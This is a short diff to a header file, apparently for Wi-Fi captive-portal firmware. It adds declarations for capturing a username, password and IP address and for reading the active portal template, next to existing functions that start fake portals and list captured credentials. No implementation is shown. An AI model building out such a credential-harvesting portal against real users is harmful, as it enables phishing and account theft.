@@ -33,6 +33,8 @@ void initCaptivePortal();
 void startCaptivePortal(int templateIdx, const char* customSSID);
 void stopCaptivePortal();
 void clearCreds();
+bool captureCred(const char* user, const char* pass, const char* ip);
+int getActivePortalTemplate();
 String getPortalStatusJSON();
 String getPortalCredsJSON();
 String getPortalTemplatesJSON();
